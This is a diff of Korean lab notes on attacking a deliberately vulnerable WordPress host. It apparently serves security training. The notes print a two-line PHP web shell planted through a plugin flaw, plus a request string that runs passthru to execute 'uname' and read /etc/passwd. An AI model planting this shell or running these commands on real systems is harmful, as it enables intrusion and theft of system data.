@@ -47,16 +47,19 @@ parameter='value'& 구조로 되어 있다.
 ![[Pasted image 20240930140229.png]]
 - 플러그인의 취약점을 활용해 웹 쉘을 작성
 
-![[Pasted image 20240930140302.png]]![[Pasted image 20240930140650.png]]
+![[Pasted image 20240930140302.png]]![[Pasted image 20240930143355.png]]
 ```
 @extract($_REQUEST); // 문자열을 입력받아 추출
-if (isset($s) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령어)에 대입
+if (isset($x) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령어)에 대입
 ```
 코드 변경사항 저장
 
 `http://vulnwp/wordpress/wp-content/plugins/`에 플러그인이 모두 저장되어 있다.
 ![[Pasted image 20240930141315.png]]
 `x=passthru&y=pwd;uname -a cat /etc/issu; cat /etc/passwd;` 이어서 명령어를 입력할 수 있다.
+![[Pasted image 20240930143420.png]]
+![[Pasted image 20240930143510.png]]
+
 ![[Pasted image 20240930142417.png]]
 브라우저에서는 문자열로 인식하기 때문에 웹 쉘을 사용하게 된다.
 
@@ -68,3 +71,6 @@ if (isset($s) && isset($y)) @die($x($y)); // 추출 결과가 x(함수) y(명령
 로그인 시도 > 브래이크 포인트에 갖힘
 ![[Pasted image 20240930142744.png]]
 ![[Pasted image 20240930142930.png]]![[Pasted image 20240930142944.png]]![[Pasted image 20240930143000.png]]
+
+![[Pasted image 20240930143731.png]]
+엑티브 스캔 툴을 활용해 스캔 작업을 더 편리하게(더 상세하게) 검사할 수 있다.
